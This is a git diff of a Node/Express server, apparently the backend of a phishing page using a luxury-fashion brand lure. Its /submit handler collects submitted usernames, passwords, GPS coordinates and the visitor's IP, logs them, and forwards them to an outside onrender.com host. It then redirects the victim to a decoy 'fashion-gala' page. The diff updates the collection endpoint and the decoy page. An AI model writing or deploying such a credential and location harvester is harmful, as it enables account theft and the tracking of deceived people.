@@ -11,13 +11,11 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json());
 
-
-});
-
 app.post('/submit', async (req, res) => {
   try {
     const { username, password, latitude, longitude } = req.body;
     const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    
     const logData = {
       timestamp: new Date().toISOString(),
       ip: clientIp,
@@ -37,13 +35,13 @@ app.post('/submit', async (req, res) => {
     console.log("📍 Standort:", latitude, longitude);
     console.log("📍 IP:", clientIp);
 
-    await fetch('https://loropiana.onrender.com/submit', {
+    await fetch('https://loropiana-p9gb.onrender.com/submit', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(logData)
     });
 
-    res.redirect('/danke.html');
+    res.redirect('/fashion-gala.html');
 
   } catch (error) {
     console.error("❌ Fehler:", error);
